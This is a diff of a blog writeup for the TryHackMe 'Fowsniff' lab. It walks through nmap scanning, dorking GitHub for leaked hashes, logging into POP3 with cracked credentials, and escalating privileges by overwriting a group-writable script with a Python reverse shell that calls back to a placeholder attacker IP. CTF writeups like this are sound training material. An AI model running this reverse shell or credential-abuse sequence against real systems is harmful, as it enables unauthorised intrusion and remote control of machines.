@@ -3,200 +3,180 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Day_1 — Fowsniff (TryHackMe) — Writeup | CyberSeeker</title>
-  <link rel="stylesheet" href="../style.css" />
+  <title>Fowsniff (TryHackMe) — Writeup | CyberSeeker</title>
+  <meta name="description" content="TryHackMe Fowsniff writeup — Recon, POP3 exploitation, credential cracking, and privilege escalation walkthrough."/>
   <style>
-    :root{
-      --bg: #07130b;
-      --panel: #0b261b;
-      --muted: #9bd6b3;
+    :root {
+      --bg:#07130b;
+      --panel:#0e2a1f;
       --accent:#2aa876;
-      --text: #e6f6ee;
-      --code-bg:#041612;
-      --card-radius:14px;
-      --glass: rgba(255,255,255,0.02);
+      --muted:#9bd6b3;
+      --text:#e6f6ee;
+      --code-bg:#052017;
+      --card-radius:12px;
+      font-family: Inter, ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
     }
-    html,body{height:100%; margin:0; background:linear-gradient(180deg,var(--bg),#03110b 85%); color:var(--text); font-family:Inter, ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial; -webkit-font-smoothing:antialiased;}
-    .container{ max-width:980px; margin:28px auto; padding:20px; }
-    header{ display:flex; gap:18px; align-items:center; margin-bottom:20px; }
-    .logo{ width:68px; height:68px; border-radius:12px; display:flex; align-items:center; justify-content:center; font-weight:800; color:var(--bg); background:linear-gradient(135deg,var(--accent),#1b6f4e); box-shadow:0 8px 30px rgba(10,20,12,0.6); font-size:18px; }
-    h1{ margin:0; font-size:22px; letter-spacing:0.2px; }
-    .meta{ margin-top:6px; color:var(--muted); font-size:13px; }
-    .lead{ background:linear-gradient(180deg, rgba(42,168,118,0.04), rgba(255,255,255,0.01)); padding:14px; border-radius:12px; margin-bottom:18px; border:1px solid rgba(255,255,255,0.03); color:var(--muted); }
-    .card{ background:linear-gradient(180deg,var(--panel), rgba(0,0,0,0.03)); padding:16px; border-radius:var(--card-radius); margin-bottom:16px; box-shadow:0 10px 30px rgba(3,8,6,0.6); border:1px solid var(--glass); }
-    section h2{ color:var(--accent); margin:0 0 10px 0; font-size:16px; }
-    pre{ background:var(--code-bg); padding:12px; border-radius:10px; overflow:auto; font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, "Roboto Mono", monospace; font-size:13px; border:1px solid rgba(0,0,0,0.25); color:var(--text); }
-    code{ color:var(--text); }
-    .img-wrap{ margin:12px 0; border-radius:8px; overflow:hidden; border:1px solid rgba(255,255,255,0.03); background:#03120d; padding:8px; }
-    img.screenshot{ max-width:100%; height:auto; display:block; border-radius:6px; }
-    .cmd-row{ display:flex; gap:12px; flex-wrap:wrap; margin-top:10px; }
-    .cmd{ background:#062618; padding:12px; border-radius:10px; min-width:220px; border:1px solid rgba(255,255,255,0.02); box-shadow:0 6px 18px rgba(1,6,3,0.6); }
-    .small{ font-size:13px; color:var(--muted); }
-    .password{ font-family: ui-monospace, monospace; background:#061a13; padding:6px 8px; border-radius:6px; border:1px solid rgba(255,255,255,0.03); color:var(--text); }
-    .reveal{ background:linear-gradient(180deg,#0f4b2f,#0b3e28); color:#cfefe0; border:0; padding:8px 10px; border-radius:8px; cursor:pointer; box-shadow:0 6px 14px rgba(5,20,12,0.5); }
-    footer{ margin-top:18px; color:var(--muted); font-size:13px; }
-    @media (max-width:720px){
-      .cmd-row{ flex-direction:column; }
-      header{ gap:12px; }
+    html, body {height:100%;}
+    body {
+      margin:0;
+      background:linear-gradient(180deg,var(--bg),#062117 80%);
+      color:var(--text);
+      padding:36px;
+      line-height:1.5;
+      -webkit-font-smoothing:antialiased;
+      -moz-osx-font-smoothing:grayscale;
     }
+    .container {max-width:980px;margin:0 auto;}
+    header {
+      display:flex;
+      gap:18px;
+      align-items:center;
+      margin-bottom:22px;
+    }
+    .logo {
+      width:72px;height:72px;
+      border-radius:12px;
+      background:linear-gradient(135deg,var(--accent),#1b6f4e);
+      display:flex;align-items:center;justify-content:center;
+      font-weight:800;font-size:22px;color:var(--bg);
+      box-shadow:0 6px 18px rgba(15,30,20,0.6);
+    }
+    h1 {margin:0;font-size:28px;}
+    .meta {color:var(--muted);margin-top:6px;font-size:14px;}
+    .card {
+      background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(0,0,0,0.04));
+      border-radius:var(--card-radius);
+      padding:18px;margin-bottom:18px;
+      box-shadow:0 8px 30px rgba(4,10,6,0.45);
+      border:1px solid rgba(43,108,87,0.07);
+    }
+    nav.toc {display:flex;gap:12px;flex-wrap:wrap;margin-bottom:14px;}
+    nav.toc a {
+      color:var(--muted);text-decoration:none;
+      background:rgba(255,255,255,0.02);
+      padding:8px 10px;border-radius:10px;
+      border:1px solid rgba(255,255,255,0.02);
+      font-size:13px;
+    }
+    section h2 {font-size:18px;color:var(--accent);margin-top:6px;}
+    pre {
+      background:var(--code-bg);padding:12px;border-radius:10px;
+      overflow:auto;font-family:"Source Code Pro",ui-monospace,SFMono-Regular,Menlo,Monaco,"Roboto Mono",monospace;
+      font-size:13px;border:1px solid rgba(0,0,0,0.2);
+    }
+    code {color:var(--text);}
+    .img-wrap {margin:12px 0;border-radius:8px;overflow:hidden;border:1px solid rgba(255,255,255,0.03);background:#03120d;padding:8px;}
+    img.screenshot {max-width:100%;height:auto;display:block;border-radius:6px;}
+    footer {margin-top:26px;color:var(--muted);font-size:13px;}
+    .tag {display:inline-block;background:rgba(42,168,118,0.12);color:var(--muted);padding:6px 8px;border-radius:8px;margin-right:8px;font-size:12px;}
   </style>
 </head>
 <body>
   <div class="container">
     <header>
-      <div class="logo">Day_1</div>
+      <div class="logo">day-1</div>
       <div>
-        <h1>Fowsniff — Day_1 (TryHackMe)</h1>
-        <div class="meta">Enumeration → OSINT → POP3 → SSH → Reverse shell · by <strong>Svfear</strong></div>
+        <h1>Fowsniff (TryHackMe)</h1>
+        <div class="meta">Writeup · POP3 Exploitation → Credential Discovery → Privilege Escalation · by <strong>Svfear</strong></div>
       </div>
     </header>
 
-    <div class="lead">
-      <strong>Summary:</strong> Found leaked hashes via GitHub dorking, cracked them to build user/pass lists, authenticated to POP3, retrieved an email containing a temporary SSH password, SSH’d to a user account, and used a writable group-owned script to inject a reverse shell. This post documents the workflow and key commands.
+    <div class="card">
+      <nav class="toc">
+        <a href="#nmap">Nmap</a>
+        <a href="#recon">Website Recon</a>
+        <a href="#github">GitHub Leak</a>
+        <a href="#pop3">POP3 Enumeration</a>
+        <a href="#ssh">SSH Access</a>
+        <a href="#priv-esc">Privilege Escalation</a>
+        <a href="#root">Root</a>
+      </nav>
+      <div style="margin-top:8px;color:var(--muted);font-size:14px;">
+        Summary: Found leaked credentials via GitHub, cracked hashes, authenticated through POP3 to retrieve internal emails revealing SSH credentials, then gained shell and privilege escalation through a vulnerable script.
+      </div>
     </div>
 
-    <section class="card">
+    <section id="nmap" class="card">
       <h2>Nmap</h2>
-      <p class="small">Command:</p>
+      <p>Initial scan for open services:</p>
       <pre><code>nmap -sV -sS -sC 10.10.147.226 -oN nmap.txt</code></pre>
-
-      <div class="img-wrap">
-        <img class="screenshot" src="/assets/day1/Pasted image 20251025211408.png" alt="nmap output">
-      </div>
-
-      <p class="small">Open ports discovered: <code>22</code>, <code>80</code>, <code>110</code>, <code>143</code>.</p>
+      <div class="img-wrap"><img class="screenshot" src="assets/fowsniff/nmap.png" alt="nmap scan result"></div>
+      <p>Discovered four open ports: <strong>22 (SSH), 80 (HTTP), 110 (POP3), and 143 (IMAP)</strong>.</p>
     </section>
 
-    <section class="card">
-      <h2>Web & OSINT</h2>
-      <p class="small">Checked target site, noticed possible breach indicators, then used Google/GitHub dorking to find leaked user:hash entries.</p>
+    <section id="recon" class="card">
+      <h2>Website Recon</h2>
+      <p>Checked the web server and found a notice about a <strong>data breach</strong>. This hinted that sensitive data might be publicly leaked.</p>
+      <div class="img-wrap"><img class="screenshot" src="assets/fowsniff/web.png" alt="webpage screenshot"></div>
+    </section>
 
-      <div class="img-wrap">
-        <img class="screenshot" src="/assets/day1/Pasted image 20251025222129.png" alt="site screenshot">
-      </div>
-
-      <p class="small">Search example:</p>
+    <section id="github" class="card">
+      <h2>GitHub Leak Discovery</h2>
+      <p>Used Google Dorking to find any references to <code>fowsniff</code> on GitHub:</p>
       <pre><code>site:"github.com" "fowsniff"</code></pre>
-
-      <div class="img-wrap">
-        <img class="screenshot" src="/assets/day1/Pasted image 20251025222437.png" alt="github dork result">
-      </div>
-
-      <div class="img-wrap">
-        <img class="screenshot" src="/assets/day1/Pasted image 20251025222652.png" alt="dumped hashes screenshot">
-      </div>
-
-      <p class="small">Collected username:hash lines and prepared them for cracking.</p>
+      <div class="img-wrap"><img class="screenshot" src="assets/fowsniff/github.png" alt="github search results"></div>
+      <p>Found a repository containing usernames and hashed passwords:</p>
+      <pre><code>mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4
+mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56
+...
+sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e</code></pre>
+      <p>Created <code>users.txt</code> and <code>passwords.txt</code> lists to attempt password cracking.</p>
     </section>
 
-    <section class="card">
-      <h2>Cracking</h2>
-      <p class="small">Cracked hashes and created <code>users.txt</code> and <code>passwords.txt</code> for authentication trials.</p>
+    <section id="pop3" class="card">
+      <h2>POP3 Enumeration & Exploitation</h2>
+      <p>Since port 110 (POP3) was open, attempted login using cracked credentials. Metasploit confirmed a valid login:</p>
+      <pre><code>seina:scoobydoo2</code></pre>
+      <div class="img-wrap"><img class="screenshot" src="assets/fowsniff/metasploit.png" alt="metasploit pop3 screenshot"></div>
 
-      <div class="img-wrap">
-        <img class="screenshot" src="/assets/day1/Pasted image 20251025223056.png" alt="hash cracking screenshot">
-      </div>
-    </section>
-
-    <section class="card">
-      <h2>POP3 — Retrieve emails</h2>
-      <p class="small">Used Metasploit and manual POP3 checks to validate credentials. Found working account <em>(hidden by default)</em>.</p>
-
-      <div class="img-wrap">
-        <img class="screenshot" src="/assets/day1/Pasted image 20251025223838.png" alt="metasploit pop3">
-      </div>
-
-      <p>
-        <button class="reveal" onclick="document.getElementById('cred').style.display='inline-block'; this.style.display='none'">Reveal credentials</button>
-        <span id="cred" style="display:none" class="password">seina : scoobydoo2</span>
-      </p>
-
-      <p class="small">Manual interaction example:</p>
+      <p>Connected manually using <code>nc</code> to read emails:</p>
       <pre><code>nc 10.10.147.226 110
 USER seina
 PASS scoobydoo2
 LIST
-RETR 1
-RETR 2</code></pre>
+RETR 1</code></pre>
 
-      <div class="img-wrap">
-        <img class="screenshot" src="/assets/day1/Pasted image 20251025225713.png" alt="pop3 retr output">
-      </div>
-
-      <p class="small">Email 1 contained a temporary SSH password. Example (hidden):</p>
-      <button class="reveal" onclick="document.getElementById('sshpass').style.display='inline-block'; this.style.display='none'">Reveal SSH temp password</button>
-      <span id="sshpass" style="display:none" class="password">S1ck3nBluff+secureshell</span>
+      <p>Inside the first email, found a leaked SSH password:</p>
+      <pre><code>The temporary password for SSH is "S1ck3nBluff+secureshell"</code></pre>
     </section>
 
-    <section class="card">
-      <h2>SSH — Access</h2>
-      <pre><code>ssh seina@10.10.147.226
-id
-uid=1004(baksteen) gid=100(users) groups=100(users),1001(baksteen)</code></pre>
-
-      <div class="img-wrap">
-        <img class="screenshot" src="/assets/day1/Pasted image 20251025230522.png" alt="ssh session screenshot">
-      </div>
-
-      <p class="small">User gained — continued enumeration for escalation.</p>
+    <section id="ssh" class="card">
+      <h2>SSH Access</h2>
+      <pre><code>ssh baksteen@10.10.147.226
+Password: S1ck3nBluff+secureshell</code></pre>
+      <div class="img-wrap"><img class="screenshot" src="assets/fowsniff/ssh.png" alt="ssh login screenshot"></div>
+      <p>Gained access as <code>baksteen</code> (non-root). Next, privilege escalation.</p>
     </section>
 
-    <section class="card">
-      <h2>Enumeration — Writable script</h2>
-      <p class="small">Searched for files owned by <code>users</code> group and found a writable script:</p>
+    <section id="priv-esc" class="card">
+      <h2>Privilege Escalation</h2>
+      <p>Enumerated files owned by the <code>users</code> group:</p>
       <pre><code>find / -group users -type f 2>/dev/null
-/opt/cube/cube.sh
-cat /opt/cube/cube.sh</code></pre>
-
-      <div class="img-wrap">
-        <img class="screenshot" src="/assets/day1/Pasted image 20251025223500.png" alt="cube.sh content">
-      </div>
-
-      <p class="small">The script was group-writable — inject a reverse shell payload and trigger it (ensure listener is ready).</p>
-
-      <p><strong>Injected payload</strong> (replace <code>YOUR_IP</code> and port):</p>
+/opt/cube/cube.sh</code></pre>
+      <p>Replaced the contents of <code>cube.sh</code> with a reverse shell payload:</p>
       <pre><code>#!/bin/bash
-python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_IP",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</code></pre>
-
-      <p class="small">Tips before exiting SSH:</p>
-      <pre><code># on attacker:
-nc -lvnp 1234
-# optionally clear known_hosts on target if needed:
-echo "" > /root/.ssh/known_hosts</code></pre>
-
-      <div class="img-wrap">
-        <img class="screenshot" src="/assets/day1/Pasted image 20251025233737.png" alt="reverse shell connected">
-      </div>
-
-      <p class="small">Reverse shell hit — box completed for Day_1 🎉</p>
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+s.connect(("YOUR-IP",1234));
+os.dup2(s.fileno(),0);
+os.dup2(s.fileno(),1);
+os.dup2(s.fileno(),2);
+p=subprocess.call(["/bin/sh","-i"]);'</code></pre>
+      <p>Before exiting, started a listener and cleared known hosts:</p>
+      <pre><code>echo "" > /root/.ssh/known_hosts</code></pre>
     </section>
 
-    <section class="card">
-      <h2>Command Cards</h2>
-      <div class="cmd-row">
-        <div class="cmd"><strong>Scan</strong><pre><code>nmap -sV -sS -sC 10.10.147.226 -oN nmap.txt</code></pre></div>
-        <div class="cmd"><strong>OSINT</strong><pre><code>site:"github.com" "fowsniff"</code></pre></div>
-        <div class="cmd"><strong>POP3</strong><pre><code>nc 10.10.147.226 110
-USER seina
-PASS scoobydoo2</code></pre></div>
-        <div class="cmd"><strong>Reverse shell</strong><pre><code>python3 -c 'import socket,subprocess,os;...'</code></pre></div>
-      </div>
-    </section>
-
-    <section class="card">
-      <h2>Notes & References</h2>
-      <ul class="small">
-        <li>Redact or hide credentials publicly; use reveal buttons or private notes for real passwords.</li>
-        <li>OSINT + GitHub dorking can reveal leaked data — use ethically and only in lab/CTF targets.</li>
-        <li>Check group and file permissions early — writable scripts or cron jobs are high-risk escalation vectors.</li>
-      </ul>
+    <section id="root" class="card">
+      <h2>Root Shell</h2>
+      <div class="img-wrap"><img class="screenshot" src="assets/fowsniff/root.png" alt="root access screenshot"></div>
+      <p>Successfully obtained a root shell and completed the challenge. 🎯</p>
     </section>
 
     <footer>
-      <div class="small">Tags: <span style="padding:6px;background:#123b2b;border-radius:8px;margin-right:6px">TryHackMe</span><span style="padding:6px;background:#123b2b;border-radius:8px">Day_1</span></div>
-      <div style="margin-top:12px" class="small">Posted by <strong>Svfear</strong> · Documented steps for learning & portfolio. Redact sensitive details before sharing widely.</div>
+      <span class="tag">TryHackMe</span>
+      <span class="tag">POP3 Exploitation</span>
+      <span class="tag">Privilege Escalation</span>
+      <div style="margin-top:12px;">Posted by <strong>Svfear</strong> — Day_1 of my 90-day Pentesting Challenge.</div>
     </footer>
   </div>
-
 </body>
 </html>
